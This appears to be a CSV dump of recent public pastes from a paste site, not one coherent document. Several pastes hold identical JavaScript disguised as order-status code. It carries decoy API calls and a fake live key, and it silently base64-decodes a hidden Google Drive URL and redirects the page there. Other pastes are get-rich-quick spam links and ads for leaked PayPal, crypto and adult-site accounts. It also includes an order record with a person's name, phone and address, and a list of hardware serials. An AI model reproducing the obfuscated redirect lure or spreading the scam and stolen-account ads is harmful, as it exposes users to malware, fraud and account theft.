id,title,username,language,date,content
eEPsBe0Q,Untitled,kammex,JavaScript,Thursday 24th of April 2025 06:22:38 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/52202/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
q7DNuTU0,EARN $900 INSTANTLY 2025 M6,Hi55455676567,JavaScript,Thursday 24th of April 2025 06:22:37 AM CDT," 
Pdf https://tinyurl.com/privguidee

K0kF41ZvAQ
"
uTsYzmbP,Make $1000 15-MINUTES (BEGINNER) 96,Hi55455676567,JavaScript,Thursday 24th of April 2025 06:13:23 AM CDT," 
Pdf https://tinyurl.com/privguidee

LqO7Y7loVv
"
dtP4LFcY,Chaturbate with Tokens,WantingTrae,JavaScript,Thursday 24th of April 2025 06:07:32 AM CDT,02664 Accounts Posted On https://t.me/leakedbyeminem
AwWabvuj,Untitled,andreiros,JSON,Thursday 24th of April 2025 06:07:19 AM CDT,"{
  ""order"": {
    ""customer_marketing_consent"": false,
    ""customer_email"": ""test@test.com"",
    ""currency"": ""RON"",
    ""delivery_method"": ""Curier"",
    ""payment_method"": ""Ramburs"",
    ""orderdate"": ""2025-04-24"",
    ""orderid"": ""000000445"",
    ""dbid"": ""446"",
    ""ordertotal"": ""473.9900"",
    ""billing_address"": {
      ""city"": ""Sector 4"",
      ""city_id"": ""13754"",
      ""county"": ""Bucureşti"",
      ""county_code"": ""B"",
      ""country"": ""România"",
      ""country_code"": ""RO"",
      ""cod_postal"": ""040121"",
      ""address"": ""Regina Maria"",
      ""number"": """",
      ""block"": """",
      ""entrance"": """",
      ""floor"": """",
      ""flat"": """",
      ""intercom"": """",
      ""bank_account"": """",
      ""bank"": """",
      ""company"": """",
      ""client_tradeno"": """",
      ""client_cui"": """",
      ""client_type"": ""PF"",
      ""phone"": ""0722333444"",
      ""last_name"": ""Rosu"",
      ""first_name"": ""Andrei""
    },
    ""shipping_address"": {
      ""city"": ""Sector 4"",
      ""city_id"": ""13754"",
      ""county"": ""Bucureşti"",
      ""county_code"": ""B"",
      ""country"": ""România"",
      ""country_code"": ""RO"",
      ""cod_postal"": ""040121"",
      ""address"": ""Regina Maria"",
      ""number"": ""1"",
      ""block"": """",
      ""entrance"": """",
      ""floor"": """",
      ""flat"": """",
      ""intercom"": """",
      ""phone"": ""0722333444"",
      ""last_name"": ""Rosu"",
      ""first_name"": ""Andrei""
    },
    ""order_notes"": null,
    ""order_notes_internal"": ""Order Placed by Andrei Rosu using Login as Customer"",
    ""payment_type"": ""cashondelivery"",
    ""payment_card"": {
      ""rrncode"": null
    },
    ""items"": [
      {
        ""currency"": ""RON"",
        ""finalprice"": ""449.9985"",
        ""price"": ""450.0000"",
        ""product_price_site"": 450,
        ""quantity"": 1,
        ""item_um"": ""buc"",
        ""item_vat"": 19,
        ""item_name"": ""Underbust Bretele Denim"",
        ""item_code"": ""CHFCYE0049"",
        ""delivery_date"": null
      },
      {
        ""currency"": ""RON"",
        ""finalprice"": ""23.9900"",
        ""price"": ""23.9900"",
        ""quantity"": 1,
        ""item_um"": ""buc"",
        ""item_vat"": 19,
        ""item_name"": ""Cheltuieli transport"",
        ""item_code"": ""Curier"",
        ""locker_id"": 0
      }
    ],
    ""delivery_date"": null
  }
}"
8nw4t2XA,Products.js,kammex,JavaScript,Thursday 24th of April 2025 06:07:15 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/03634/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
iRigxi4B,dataNone,TestGuy1,JSON,Thursday 24th of April 2025 06:00:05 AM CDT,"{
  status: 'Success',
  method: 'server',
  maindata: 'c02ac118aa40ca400b81b73b7c12865bd5f5f541bad1103a1521dd431b13b6970e8c0479c25c2d1e69aa0ec7540f53f853b626441f5de869da23e75c8d7eb9133203ac4f2b0d664ba11ce9d6b5b64afe4e1a137fee8b097bc62df77a0efa95c8f15374f2af5bb3dfd6301a91881663fa5798c363cee74b54e1ac88bae6415f63',
  otherdata: [
    '09213765abcb08caf2b016e33161e539',
    'de97c072977725be63eed19a3b90c684',
    '8c1977218e2331f11203cb9ed516dd4a',
    'e6eb8b583bfc8357971c8d9f9a3ba313',
    '9ae35c97f9d9a7290c2cc09f237d3c66',
    '218e02f1dbd9baca4754898044001693',
    '6fa1ed86088916d89935d3e53f6d7db1',
    '3781b42a2ba78a09b783cc7c0f4915d4'
  ]
}"
Qx4YBSA3,Crypto Accounts,WantingTrae,JavaScript,Thursday 24th of April 2025 05:52:09 AM CDT,96820 Accounts Posted On https://t.me/leakedbyeminem
b6Rc8WiW,Order.js,kammex,JavaScript,Thursday 24th of April 2025 05:51:53 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/84252/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
35Zu00RN,PayPal with Balance,WantingTrae,JavaScript,Thursday 24th of April 2025 05:36:47 AM CDT,41083 Accounts Posted On https://t.me/leakedbyeminem
SagYDX7K,Market.js,kammex,JavaScript,Thursday 24th of April 2025 05:36:30 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/96280/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
1vz0gjBX,Untitled,hodifa_almosa_0966,Lua,Thursday 24th of April 2025 05:33:00 AM CDT,"A032_9963_8203_1001.
0000_0006_2409_5316_CAF2_5B03_6E00_01DB.
EI74N11841020573H
A032_99EE_C50E_CD00.
76UMT8JNT
0025_38D2_2149_01AB.
5CD2_E481_31C0_EFF6.
0000_0000_0000_0000_0026_B728_31EE_BD15.
YS202010122218HP
WD-WCC6Y5EVN78S
S3Z9NB0K910845K
AA0000000519
DH20230816220923
WD-WX21AC49U2VL
75D4PR6IT
2020172302289
6479_A751_9090_0D22.
0025_38AB_01D5_6343.
0025_38E2_31B4_9100.
50026B7784B0A596
184590449213
S2WG43PD
57G9COPJT
X8VLWAMNS
WD-WXF0AA9X0852
85QRR6GJF
172534800540
CY99N023611609L5G   _00000001.
MI81N061510201C0Z
274S100LTDQT
YS20230401136661
S35ENX1K447281
50026B73816A9BFE
WX51EC6A96N2
192188804356
39K2JFIYF
J2180053CHXZ5D
0100_0000_0000_0000_8CE3_8E04_0385_4BB6.
0025_3884_9108_2233.
ACE4_2E00_0626_D2A1.
0008_0D04_0084_6915.
37PNPWL1T
E2P342332VSK4J
90H2B14XB
UB202306094196
170615BB1F8B
H2UBIY401095833
WKPR271F
30033056010
YS202010685678HP
YS202010528619HP
NA7T130X
1811A5801224
WD-WXK1A29KZ317
0000_0000_0000_0000_0026_B768_5D4D_EAA5.
WKPQKXDP
50026B77850F5FC2
2475SS24S
E202111190070415
NKP68520102340S30E
30081176769
S20GNAAH111262
H2UBIL308283576
686EW29BT"
Tpc9FCHW,Untitled,kammex,JavaScript,Thursday 24th of April 2025 05:21:08 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/08675/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
wX0jRrpH,PayPal with Balance,kammex,JavaScript,Thursday 24th of April 2025 05:21:02 AM CDT,15372 Accounts Posted On https://t.me/leakedbyeminem
